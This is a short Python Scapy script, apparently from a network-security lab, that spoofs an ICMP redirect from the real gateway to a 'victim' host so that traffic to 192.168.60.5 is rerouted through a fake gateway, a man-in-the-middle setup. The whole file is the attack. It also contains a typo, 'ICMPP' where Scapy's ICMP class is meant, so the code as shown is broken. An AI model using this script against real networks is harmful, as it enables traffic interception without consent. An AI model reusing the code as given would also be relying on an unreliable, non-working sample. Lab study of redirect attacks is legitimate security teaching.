#!/usr/bin/python3

from scapy.all import *

# Remember to run the following command on victim (turn on all accept)
# sudo sysctl net.ipv4.conf.all.accept_redirects=1

victim = '10.9.0.5'
real_gateway = '10.9.0.11'
fake_gateway = '10.9.0.111'

ip = IP(src = real_gateway, dst = victim)
icmp = ICMPP(type=5, code=1)  # 5 = Redirect, 1 = Redirect Datagram for the Host
icmp.gw = fake_gateway

# make header packet that looks like sent from victim to desired dest
ip2 = IP(src = victim, dst = '192.168.60.5')

send(ip/icmp/ip2/ICMP());
